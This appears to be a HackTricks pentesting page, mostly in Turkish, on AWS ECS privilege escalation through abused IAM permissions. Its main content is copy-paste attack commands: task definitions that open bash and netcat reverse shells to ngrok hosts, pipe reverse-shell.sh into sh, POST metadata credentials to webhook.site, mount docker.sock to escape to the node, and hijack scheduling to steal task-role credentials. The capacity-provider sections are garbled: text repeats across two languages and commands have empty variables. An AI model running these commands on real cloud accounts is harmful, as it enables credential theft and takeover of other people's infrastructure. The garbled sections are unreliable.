# AWS - ECS Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECS

ECS hakkında daha fazla **bilgi** için:

{{#ref}}
../../aws-services/aws-ecs-enum.md
{{#endref}}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

ECS içinde `iam:PassRole`, `ecs:RegisterTaskDefinition` ve `ecs:RunTask` izinlerini suistimal eden bir saldırgan, metadata kimlik bilgilerini çalan bir **malicious container** içeren yeni bir **task definition** oluşturup bunu **çalıştırabilir**.

{{#tabs }}
{{#tab name="Reverse Shell" }}
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
{{#endtab }}

{{#tab name="Webhook" }}

webhook.site gibi bir site kullanarak bir webhook oluşturun
```bash

# Create file container-definition.json
[
{
"name": "exfil_creds",
"image": "python:latest",
"entryPoint": ["sh", "-c"],
"command": [
"CREDS=$(curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}); curl -X POST -H 'Content-Type: application/json' -d \"$CREDS\" https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890"
]
}
]

# Run task definition, uploading the .json file
aws ecs register-task-definition \
--family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 \
--memory 512 \
--requires-compatibilities FARGATE \
--container-definitions file://container-definition.json

# Check the webhook for a response

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1

```
{{#endtab }}

{{#endtabs }}

**Potential Impact:** Doğrudan farklı bir ECS role privesc.

### `iam:PassRole`,`ecs:RunTask`
Bir saldırgan `iam:PassRole` ve `ecs:RunTask` izinlerine sahipse, değiştirilmiş **execution role**, **task role** ve container'ın **command** değerleriyle yeni bir ECS task başlatabilir.  `ecs run-task` CLI komutu, görev tanımına dokunmadan çalışma zamanında `executionRoleArn`, `taskRoleArn` ve container'ın `command`'ini değiştirmeye izin veren `--overrides` bayrağını içerir.

taskRoleArn ve executionRoleArn için belirtilen IAM rolleri, trust policy'lerinde `ecs-tasks.amazonaws.com` tarafından assume edilebileceğinin belirtilmiş olması gerekir.

Ayrıca saldırganın bilmesi gerekir:
- ECS cluster adı
- VPC Subnet
- Security group (Eğer security group belirtilmezse varsayılan kullanılacaktır)
- Task Definition adı ve revizyonu
- Container'ın adı
```bash
aws ecs run-task \
--cluster <cluster-name> \
--launch-type FARGATE \
--network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" \
--task-definition <task-definition:revision> \
--overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": <container-name>,
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
Yukarıdaki kod parçasında bir saldırgan yalnızca `taskRoleArn` değerini geçersiz kılar. Ancak saldırının gerçekleşmesi için saldırganın, komutta belirtilen `taskRoleArn` üzerinde ve task tanımında belirtilen `executionRoleArn` üzerinde `iam:PassRole` iznine sahip olması gerekir.

Eğer saldırganın geçebildiği IAM rolü, ECR imajını çekmek ve ECS task'ını başlatmak için yeterli ayrıcalıklara sahipse (`ecr:BatchCheckLayerAvailability`, `ecr:GetDownloadUrlForLayer`,`ecr:BatchGetImage`,`ecr:GetAuthorizationToken`), saldırgan `ecs run-task` komutunda hem `executionRoleArn` hem de `taskRoleArn` için aynı IAM rolünü belirtebilir.
```sh
aws ecs run-task --cluster <cluster-name> --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" --task-definition <task-definition:revision> --overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"executionRoleArn":"arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": "<container-name>",
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
**Olası Etki:** Direct privesc to any ECS task role.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

Önceki örnekte olduğu gibi, ECS'te **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** izinlerini kullanan bir saldırgan, **yeni bir task definition** oluşturabilir; bu task definition, metadata credentials'i çalan **kötü amaçlı container** içerebilir ve saldırgan bunu **çalıştırabilir**.\
Ancak bu durumda, kötü amaçlı task definition'ı çalıştırmak için bir container instance gereklidir.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Potential Impact:** Herhangi bir ECS rolüne doğrudan privesc.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`

Önceki örnekte olduğu gibi, ECS'de **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** veya **`ecs:CreateService`** izinlerini kötüye kullanan bir saldırgan, **yeni bir task definition oluşturabilir**; bu tanım metadata kimlik bilgilerini çalan bir **kötü amaçlı container** içerir ve bunu **en az 1 task çalıştıracak şekilde yeni bir service oluşturarak çalıştırabilir.**
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**Potential Impact:** Herhangi bir ECS rolüne doğrudan privesc.

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`

Aslında, sadece bu izinlerle overrides kullanarak, herhangi bir role sahip bir container içinde rastgele komutlar çalıştırmak mümkün; örneğin:
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
**Potansiyel Etki:** Herhangi bir ECS role'üne doğrudan privesc.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Bu senaryo öncekiyle benzer ama **`iam:PassRole`** izni **olmaksızın**.\
Bu hâlâ ilginç çünkü keyfi bir container çalıştırabiliyorsanız, rolü olmasa bile, **node'dan kaçmak için ayrıcalıklı bir container çalıştırabilir** ve node üzerinde çalışan **EC2 IAM rolünü** ve **diğer ECS container'larının rollerini** çalabilirsiniz.\
Hatta ele geçirdiğiniz EC2 instance'ında diğer task'ların çalışmasını zorlayarak onların kimlik bilgilerini çalabilirsiniz (daha önce [**Privesc to node section**](aws-ecs-post-exploitation/README.md#privesc-to-node) bölümünde tartışıldığı gibi).

> [!WARNING]
> Bu saldırı yalnızca **ECS cluster'ın EC2 instance'larını kullanması** ve Fargate kullanmaması durumunda mümkündür.
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Bir saldırganın **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** izinlerine sahip olması durumunda, çalışan bir container içinde **komut çalıştırabilir** ve buna bağlı IAM rolünü sızdırabilir (describe izinlerine ihtiyacınız vardır çünkü `aws ecs execute-command` çalıştırmak için gereklidir).\
Ancak, bunu yapabilmek için container instance'ın **ExecuteCommand agent**'ı çalıştırıyor olması gerekir (varsayılan olarak çalışmıyor).

Bu nedenle, saldırgan şunları deneyebilir:

- **Her çalışan container'da bir komut çalıştırmayı denemek**
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
- Eğer kullanıcının **`ecs:RunTask`** izni varsa, `aws ecs run-task --enable-execute-command [...]` ile bir task çalıştırın
- Eğer kullanıcının **`ecs:StartTask`** izni varsa, `aws ecs start-task --enable-execute-command [...]` ile bir task çalıştırın
- Eğer kullanıcının **`ecs:CreateService`** izni varsa, `aws ecs create-service --enable-execute-command [...]` ile bir service oluşturun
- Eğer kullanıcının **`ecs:UpdateService`** izni varsa, `aws ecs update-service --enable-execute-command [...]` ile bir service güncelleyin

Bu seçeneklerin örneklerini **önceki ECS privesc bölümlerinde** bulabilirsiniz.

**Potential Impact:** Konteynerlere atanmış farklı bir role privesc.

### `ssm:StartSession`

Bu izni kullanarak **ECS'e privesc** yapmanın ayrıntıları için **ssm privesc sayfasına** bakın:

{{#ref}}
../aws-ssm-privesc/README.md
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

Bu izinleri kullanarak **ECS'e privesc** yapmanın ayrıntıları için **ec2 privesc sayfasına** bakın:

{{#ref}}
../aws-ec2-privesc/README.md
{{#endref}}

### `ecs:RegisterContainerInstance`, `ecs:DeregisterContainerInstance`, `ecs:StartTask`, `iam:PassRole`

Bu izinlere sahip bir saldırgan, potansiyel olarak bir EC2 instance'ını bir ECS cluster'ına kaydedip üzerinde task çalıştırabilir. Bu, saldırganın ECS task'larının bağlamında istediği kodu çalıştırmasına izin verebilir.

- TODO: Farklı bir AWS hesabından bir instance kaydetmek ve böylece task'ların saldırganın kontrolündeki makinelerde çalıştırılmasını sağlamak mümkün mü??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

> [!NOTE]
> TODO: Test this

Bu izinlere sahip bir saldırgan, mevcut bir ECS servisi için kötü amaçlı bir task set oluşturabilir ve primary task set'i güncelleyebilir. Bu, saldırganın servis içinde istediği kodu çalıştırmasına olanak tanır.
```bash
# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**Potansiyel Etki**: Etkilenen serviste rastgele kod çalıştırma, servis işlevselliğini etkileyebilir veya hassas verileri sızdırabilir.

## Referanslar

- [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)

{{#include ../../../../banners/hacktricks-training.md}}





### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

ECS capacity providers'ı yönetme ve servisleri güncelleme izinlerine sahip bir saldırgan, kontrol ettiği bir EC2 Auto Scaling Group oluşturabilir, bunu bir ECS Capacity Provider içine sarıp hedef cluster'a iliştirip mağdur servisi bu provider'ı kullanacak şekilde taşıyabilir. Böylece tasks saldırgan kontrolündeki EC2 instances üzerine planlanır; bu, konteynerleri OS seviyesinde inceleme ve task role credentials çalma imkanı sağlar.

Komutlar (us-east-1):

- Önkoşullar



- Hedef cluster'a katılacak ECS agent için bir Launch Template oluşturun



- Auto Scaling Group oluşturun



- ASG'den bir Capacity Provider oluşturun



- Capacity Provider'ı cluster'a iliştirin (isteğe bağlı olarak varsayılan olarak)



- Bir servisi sağlayıcınıza taşıyın



- Tasks'ın saldırgan instance'larına düştüğünü doğrulayın



- Opsiyonel: EC2 node'dan, docker exec ile hedef konteynerlere girip http://169.254.170.2 adresini okuyarak task role credentials elde edin.

- Temizleme



**Potansiyel Etki:** Saldırgan kontrolündeki EC2 node'lar mağdur tasks'ı çalıştırır; bu, konteynerlere OS-seviyesinde erişim ve task IAM role credential'larının çalınmasına olanak verir.


<details>
<summary>Aşama aşama komutlar (kopyala/yapıştır)</summary>
<pre>
export AWS_DEFAULT_REGION=us-east-1
CLUSTER=arn:aws:ecs:us-east-1:947247140022:cluster/ht-victim-cluster
# Instance profile for ECS nodes
aws iam create-role --role-name ht-ecs-instance-role --assume-role-policy-document Version:2012-10-17 || true
aws iam attach-role-policy --role-name ht-ecs-instance-role --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role || true
aws iam create-instance-profile --instance-profile-name ht-ecs-instance-profile || true
aws iam add-role-to-instance-profile --instance-profile-name ht-ecs-instance-profile --role-name ht-ecs-instance-role || true

VPC=vpc-18e6ac62
SUBNETS=

AMI=ami-0b570770164588ab4
USERDATA=IyEvYmluL2Jhc2gKZWNobyBFQ1NfQ0xVU1RFUj0gPj4gL2V0Yy9lY3MvZWNzLmNvbmZpZwo=
LT_ID=

ASG_ARN=

CP_NAME=htcp-8797
aws ecs create-capacity-provider --name  --auto-scaling-group-provider "autoScalingGroupArn=,managedScaling={status=ENABLED,targetCapacity=100},managedTerminationProtection=DISABLED"
aws ecs put-cluster-capacity-providers --cluster "" --capacity-providers  --default-capacity-provider-strategy capacityProvider=,weight=1

SVC=
# Task definition must be EC2-compatible (not Fargate-only)
aws ecs update-service --cluster "" --service "" --capacity-provider-strategy capacityProvider=,weight=1 --force-new-deployment

TASK=
CI=
aws ecs describe-container-instances --cluster "" --container-instances "" --query containerInstances[0].ec2InstanceId --output text
</pre>
</details>

### Backdoor compute in-cluster via ECS Anywhere EXTERNAL registration

ECS Anywhere'ı kötüye kullanarak saldırgan kontrolündeki bir hostu, mağdurun ECS cluster'ında EXTERNAL container instance olarak kaydedip o host üzerinde privileged task ve execution role'ları kullanarak tasks çalıştırabilirsiniz. Bu, tasks'ın nerede çalıştığı üzerinde OS-seviyesinde kontrol (kendi makineniz) sağlar ve capacity providers veya ASGs ile uğraşmadan tasks ve eklenen volume'lardan credential/veri hırsızlığına izin verir.

- Gerekli izinler (örnek minimal):
- ecs:CreateCluster (optional), ecs:RegisterTaskDefinition, ecs:StartTask or ecs:RunTask
- ssm:CreateActivation, ssm:DeregisterManagedInstance, ssm:DeleteActivation
- iam:CreateRole, iam:AttachRolePolicy, iam:DeleteRole, iam:PassRole (for the ECS Anywhere instance role and task/execution roles)
- logs:CreateLogGroup/Stream, logs:PutLogEvents (if using awslogs)

- Etki: Seçilen taskRoleArn ile saldırgan hostunda rastgele container'lar çalıştırın; task-role credential'lerini 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI üzerinden çıkartın; task'lar tarafından bağlanan volume'lara erişin; capacity providers/ASGs manipülasyonundan daha gizli.

Adımlar

1) Cluster oluşturun/tespit edin (us-east-1)
```bash
aws ecs create-cluster --cluster-name ht-ecs-anywhere
```
2) ECS Anywhere rolü oluşturun ve SSM aktivasyonu (on-prem/EXTERNAL instance için)
```bash
aws iam create-role --role-name ecsAnywhereRole \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ssm.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role
ACTJSON=$(aws ssm create-activation --iam-role ecsAnywhereRole)
ACT_ID=$(echo $ACTJSON | jq -r .ActivationId); ACT_CODE=$(echo $ACTJSON | jq -r .ActivationCode)
```
3) Saldırgan hostu sağla ve otomatik olarak EXTERNAL olarak kaydet (örnek: küçük AL2 EC2 “on‑prem” olarak)

<details>
<summary>user-data.sh</summary>
```bash
#!/bin/bash
set -euxo pipefail
amazon-linux-extras enable docker || true
yum install -y docker curl jq
systemctl enable --now docker
curl -fsSL -o /root/ecs-anywhere-install.sh "https://amazon-ecs-agent.s3.amazonaws.com/ecs-anywhere-install-latest.sh"
chmod +x /root/ecs-anywhere-install.sh
/root/ecs-anywhere-install.sh --cluster ht-ecs-anywhere --activation-id ${ACT_ID} --activation-code ${ACT_CODE} --region us-east-1
```
</details>
```bash
AMI=$(aws ssm get-parameters --names /aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2 --query 'Parameters[0].Value' --output text)
IID=$(aws ec2 run-instances --image-id $AMI --instance-type t3.micro \
--user-data file://user-data.sh --query 'Instances[0].InstanceId' --output text)
aws ec2 wait instance-status-ok --instance-ids $IID
```
4) EXTERNAL container instance'in katıldığını doğrulayın
```bash
aws ecs list-container-instances --cluster ht-ecs-anywhere
aws ecs describe-container-instances --cluster ht-ecs-anywhere \
--container-instances <ci-arn> --query 'containerInstances[0].[ec2InstanceId,attributes]'
# ec2InstanceId will be mi-XXXXXXXX (SSM managed instance id) and attributes include ecs.capability.external
```
5) task/execution rolleri oluşturun, EXTERNAL task definition'ı kaydedin ve bunu attacker host üzerinde çalıştırın
```bash
# roles
aws iam create-role --role-name ht-ecs-task-exec \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ht-ecs-task-exec --policy-arn arn:aws:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy
aws iam create-role --role-name ht-ecs-task-role \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
# attach any privileges you want to abuse to this task role

# task def (EXTERNAL launch)
cat > td-external.json << 'JSON'
{
"family": "ht-external",
"requiresCompatibilities": [ "EXTERNAL" ],
"networkMode": "bridge",
"memory": "256",
"cpu": "128",
"executionRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-exec",
"taskRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-role",
"containerDefinitions": [
{"name":"steal","image":"public.ecr.aws/amazonlinux/amazonlinux:latest",
"entryPoint":["/bin/sh","-c"],
"command":["REL=\$(printenv AWS_CONTAINER_CREDENTIALS_RELATIVE_URI); echo CREDS:; curl -s http://169.254.170.2\$REL; sleep 600"],
"memory": 128,
"logConfiguration":{"logDriver":"awslogs","options":{"awslogs-region":"us-east-1","awslogs-group":"/ht/ecs/anywhere","awslogs-stream-prefix":"steal"}}
}
]
}
JSON
aws logs create-log-group --log-group-name /ht/ecs/anywhere || true
aws ecs register-task-definition --cli-input-json file://td-external.json
CI=$(aws ecs list-container-instances --cluster ht-ecs-anywhere --query 'containerInstanceArns[0]' --output text)
aws ecs start-task --cluster ht-ecs-anywhere --task-definition ht-external \
--container-instances $CI
```
6) Buradan görevleri çalıştıran host üzerinde kontrol sağlarsınız. task logs'u (eğer awslogs ise) okuyabilir veya doğrudan host üzerinde exec yaparak görevlerinizden kimlik bilgilerini/veriyi exfiltrate edebilirsiniz.



#### Komut örneği (yer tutucular)




### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

An attacker with permissions to manage ECS capacity providers and update services can create an EC2 Auto Scaling Group they control, wrap it in an ECS Capacity Provider, associate it to the target cluster, and migrate a victim service to use this provider. Tasks will then be scheduled onto attacker-controlled EC2 instances, allowing OS-level access to inspect containers and steal task role credentials.

Commands (us-east-1):

- Önkoşullar



- ECS agent'in target cluster'a katılması için Launch Template oluşturun



- Auto Scaling Group oluşturun



- ASG'den bir Capacity Provider oluşturun



- Capacity Provider'ı cluster'a ilişkilendirin (isteğe bağlı olarak varsayılan olarak)



- Bir service'i provider'ınıza taşıyın



- Tasks'in attacker instance'lara düştüğünü doğrulayın



- İsteğe bağlı: EC2 node'undan docker exec ile target containers'a girin ve task role credentials elde etmek için http://169.254.170.2 adresini okuyun.

- Temizlik



**Olası Etki:** Attacker-controlled EC2 nodes victim tasks alır; bu durum containerlara OS-level erişim ve task IAM role credentials'ın çalınmasına olanak sağlar.
